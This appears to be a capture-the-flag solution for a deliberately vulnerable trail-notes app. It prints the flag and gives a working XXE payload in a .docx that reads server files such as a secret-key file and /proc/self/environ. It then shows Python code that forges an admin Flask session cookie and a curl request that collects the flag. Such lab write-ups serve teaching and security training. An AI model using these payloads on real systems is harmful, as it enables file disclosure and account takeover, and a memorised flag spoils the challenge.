**Flag:** `flag{inm_geed_greater}`
**Category:** Web
**Difficulty:** Easy–Medium
**Estimated solve time:** 30–60 minutes for a player who knows what XXE is; 1–2 hours otherwise.

## Premise

Trails is a trail-notes sharing app. Logged-in users upload a `.docx`
write-up and the server shows a text preview of it. Nothing checks
passwords — any username logs you in.

## Step 1 — Find the XXE

A `.docx` is a zip of XML parts. Trails extracts `word/document.xml` and
parses it with `lxml.etree` using `resolve_entities=True` and
`load_dtd=True` — a classic unsafe-XML-parser configuration. A document
that defines an external entity in its `<!DOCTYPE>` gets that entity's
content substituted straight into the parsed text, which then shows up
in the "preview."

Build a malicious `.docx` (see `make_malicious_docx.py`):

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///app/notes.txt">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Trip notes: &xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

Zip that as `word/document.xml` (plus a minimal `[Content_Types].xml` so
some tooling doesn't complain), upload it, and the preview page echoes
back the content of `/app/notes.txt` — proof the read primitive works.
`notes.txt` is a deliberate red herring: it just hints that the secret
key exists and gets rotated "never."

## Step 2 — Get the real secret

The natural next move is `/proc/self/environ`, since `FLASK_SECRET_KEY`
is set as an environment variable. **This deliberately fails**: environ
entries are NUL-byte separated, and a raw NUL byte is illegal inside an
XML text node, so `lxml` throws a parse error (`Invalid character: Char
0x0...`). This is a real-world gotcha with this exact bug class, not an
artificial nerf — it should nudge players toward trying other files
instead of giving up.

The intended target is `/app/secret_key.txt`, a plain-text copy of the
same key, planted specifically so the read succeeds cleanly:

```
file:///app/secret_key.txt
```

The preview returns the raw key, e.g. `t_r41l5_s3cr3t_9f3a7c21b6`.

## Step 3 — Forge an admin session cookie

Trails uses Flask's default signed-cookie sessions (itsdangerous +
`SECRET_KEY`), storing `{"username": ..., "role": "user"}`. Anyone who
knows `SECRET_KEY` can mint their own cookie claiming `role: admin`
without ever logging in as an admin — Flask has no server-side session
store to check against.

```python
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
import hashlib

secret_key = "t_r41l5_s3cr3t_9f3a7c21b6"  # from step 2
s = URLSafeTimedSerializer(
    secret_key,
    salt="cookie-session",
    serializer=TaggedJSONSerializer(),
    signer_kwargs=dict(key_derivation="hmac", digest_method=hashlib.sha1),
)
cookie = s.dumps({"username": "attacker", "role": "admin"})
```

## Step 4 — Collect the flag

```
curl --cookie "session=<forged cookie>" http://13.49.69.154:5000/admin
```

Returns `flag{inm_geed_greater}`.




